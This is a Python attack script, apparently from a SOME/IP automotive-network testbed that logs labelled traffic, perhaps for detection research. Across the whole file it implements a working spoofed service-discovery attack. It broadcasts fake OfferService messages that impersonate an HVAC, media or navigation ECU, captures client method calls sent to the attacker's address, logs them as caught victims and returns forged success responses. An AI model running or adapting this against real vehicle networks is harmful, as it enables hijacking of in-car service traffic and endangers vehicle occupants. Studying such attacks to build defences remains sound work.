"""
Spoofed SD Offer attack — announces a fake service impersonating a real ECU.

Crafts an SD OfferService message with the HVAC service ID but pointing
to the attacker's own IP/port.  If the client accepts it, subsequent
method calls go to the attacker instead of the real service.

Usage:
    python -m attacks.spoofed_offer [--service HVAC] [--attacker-ip 172.20.0.50] [--duration 15]
"""

from __future__ import annotations

import argparse
import logging
import os
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from proto.someip import SomeIpHeader, SomeIpMessage, unpack_someip, pack_someip, MessageType, ReturnCode
from proto.sd import build_offer_service
from proto.constants import (
    SERVICES, HVAC_SERVICE_ID, MEDIA_SERVICE_ID, NAV_SERVICE_ID,
    SD_PORT,
)
from client.traffic_logger import get_logger

logging.basicConfig(level=logging.INFO, format="%(asctime)s [SPOOFED_OFFER] %(message)s")
log = logging.getLogger("SpoofedOffer")

SERVICE_MAP = {
    "HVAC": HVAC_SERVICE_ID,
    "Media": MEDIA_SERVICE_ID,
    "Navigation": NAV_SERVICE_ID,
}


def main():
    parser = argparse.ArgumentParser(description="SOME/IP Spoofed Offer Attack")
    parser.add_argument("--service", choices=["HVAC", "Media", "Navigation"], default="HVAC")
    parser.add_argument("--attacker-ip", default="172.20.0.50",
                        help="IP to advertise in the fake offer")
    parser.add_argument("--attacker-port", type=int, default=30599,
                        help="Port to advertise in the fake offer")
    parser.add_argument("--broadcast-ip", default="255.255.255.255",
                        help="Broadcast address for SD offers")
    parser.add_argument("--duration", type=float, default=15,
                        help="How long to keep sending fake offers (seconds)")
    parser.add_argument("--interval", type=float, default=1.0,
                        help="Interval between fake offers (seconds)")
    parser.add_argument("--log-path", default="/logs/traffic.jsonl")
    args = parser.parse_args()

    service_id = SERVICE_MAP[args.service]
    instance_id = SERVICES[service_id]["instance_id"]

    logger = get_logger(args.log_path)
    
    # Socket for broadcasting fake offers
    offer_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    offer_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    offer_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # Socket for listening if anyone actually connects
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.settimeout(0.5)
    try:
        listen_sock.bind(("0.0.0.0", args.attacker_port))
    except OSError:
        log.warning("Could not bind to port %d, listening disabled", args.attacker_port)
        listen_sock = None

    log.info(
        "SPOOFED OFFER starting: Impersonating %s (0x%04X) at %s:%d",
        args.service, service_id, args.attacker_ip, args.attacker_port,
    )

    start_time = time.time()
    offers_sent = 0
    victims_caught = 0

    while time.time() - start_time < args.duration:
        # Broadcast fake offer
        offer_msg = build_offer_service(
            service_id=service_id,
            instance_id=instance_id,
            ip=args.attacker_ip,
            port=args.attacker_port,
            ttl=5,
        )
        offer_sock.sendto(offer_msg, (args.broadcast_ip, SD_PORT))
        offers_sent += 1

        # Log the spoofed offer
        fake_header = SomeIpHeader(
            service_id=0xFFFF,
            method_id=0x8100,
            message_type=MessageType.NOTIFICATION,
        )
        logger.log(
            fake_header, b"spoofed_offer", direction="sent",
            src_ip=args.attacker_ip, dst_ip=args.broadcast_ip,
            label="spoofed_offer",
        )
        log.info("FAKE OFFER #%d broadcast", offers_sent)

        # Check if anyone connected
        if listen_sock:
            try:
                data, addr = listen_sock.recvfrom(65535)
                victims_caught += 1
                log.warning(
                    "VICTIM CAUGHT! %s:%d sent us %d bytes",
                    addr[0], addr[1], len(data),
                )
                logger.log(
                    SomeIpHeader(service_id=service_id, method_id=0x0000),
                    data[:64], direction="received",
                    src_ip=addr[0], dst_ip=args.attacker_ip,
                    label="spoofed_offer_victim",
                )
                # Optionally send back a fake response
                try:
                    msg = unpack_someip(data)
                    resp = SomeIpHeader(
                        service_id=msg.header.service_id,
                        method_id=msg.header.method_id,
                        client_id=msg.header.client_id,
                        session_id=msg.header.session_id,
                        message_type=MessageType.RESPONSE,
                        return_code=ReturnCode.E_OK,
                    )
                    listen_sock.sendto(
                        pack_someip(SomeIpMessage(header=resp, payload=b"\x00")),
                        addr,
                    )
                except Exception:
                    pass
            except socket.timeout:
                pass

        time.sleep(args.interval)

    log.info(
        "SPOOFED OFFER complete: %d offers sent, %d victims caught",
        offers_sent, victims_caught,
    )
    offer_sock.close()
    if listen_sock:
        listen_sock.close()


if __name__ == "__main__":
    main()
